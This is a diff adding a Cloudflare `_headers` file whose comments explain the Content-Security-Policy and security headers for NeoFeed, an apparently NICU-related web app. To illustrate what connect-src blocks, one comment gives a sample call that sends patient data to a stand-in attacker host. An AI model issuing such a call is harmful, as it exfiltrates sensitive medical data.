@@ -1,0 +1,53 @@
+# Response headers for the Cloudflare Workers host.
+#
+# ⚠️ THIS FILE PROTECTS ONE OF THE TWO HOSTS. GitHub Pages has no `_headers`
+# support and ignores it completely, so everything below applies to
+# neofeed.valhalla-health.workers.dev and does nothing whatsoever for
+# valhalla-health.github.io/neofeed/ — which is still where NICU staff
+# home-screen installs point. Same asymmetry as `.assetsignore`. See STATUS.md.
+#
+# Wrangler consumes `_headers` as configuration rather than publishing it, so
+# unlike `wrangler.jsonc` it is not served back. Verified 2026-08-23.
+#
+# ── What the CSP below can and cannot do ─────────────────────────────────────
+#
+# `script-src` carries BOTH 'unsafe-inline' AND 'unsafe-eval', and that is not
+# an oversight to tidy up later. NeoFeed has no build step: @babel/standalone
+# compiles the seven .jsx modules in the browser, which needs 'unsafe-eval' to
+# transform them and 'unsafe-inline' because Babel executes the result by
+# injecting it as an inline <script>. Both stay until the app gains a build
+# step — a change `wrangler.jsonc` deliberately avoided.
+#
+# So be honest about what this buys. It does NOT stop injected inline script.
+# It DOES pin every external origin the app may reach (an injected
+# `fetch('https://attacker/…', patientData)` is blocked by `connect-src`),
+# forbid framing, and forbid <base>/<object>/off-site form posts.
+#
+# Origin-by-origin, and why each is here — do not add to this list casually,
+# because the list is the entire point:
+#   unpkg.com              React 18.3.1, ReactDOM, @babel/standalone (SRI-pinned)
+#   accounts.google.com    /gsi/client, plus the sign-in iframe it renders
+#   fonts.googleapis.com   the IBM Plex / Sarabun stylesheet
+#   fonts.gstatic.com      the font files that stylesheet pulls
+#   script.google.com      NEOFEED_GAS_URL — every backend call
+#   *.googleusercontent.com  where a GAS /exec 302-redirects its response
+#   data:                  tweaks-panel.jsx uses one inline SVG data URI
+#
+# `Cross-Origin-Opener-Policy` is `same-origin-allow-popups`, NOT `same-origin`.
+# Google Sign-In opens a popup for the account chooser; plain `same-origin`
+# severs `window.opener` and the login callback never fires. Google documents
+# the allow-popups value for exactly this. Do not "harden" it.
+#
+# Frontend hosts are origin-bound for Google Sign-In anyway — every hostname
+# must be an Authorized JavaScript origin on OAuth client 750019806043-imunne8n…
+# (REFERENCE.md § Deploying). CSP and that allow-list are separate gates; a
+# change here does not touch that one.
+
+/*
+  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://unpkg.com https://accounts.google.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https://*.gstatic.com https://*.googleusercontent.com; connect-src 'self' https://script.google.com https://script.googleusercontent.com https://accounts.google.com; frame-src https://accounts.google.com; manifest-src 'self'; base-uri 'none'; form-action 'self'; object-src 'none'; frame-ancestors 'none'
+  X-Frame-Options: DENY
+  X-Content-Type-Options: nosniff
+  Referrer-Policy: strict-origin-when-cross-origin
+  Cross-Origin-Opener-Policy: same-origin-allow-popups
+  Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=(), serial=(), bluetooth=()
+  Strict-Transport-Security: max-age=31536000
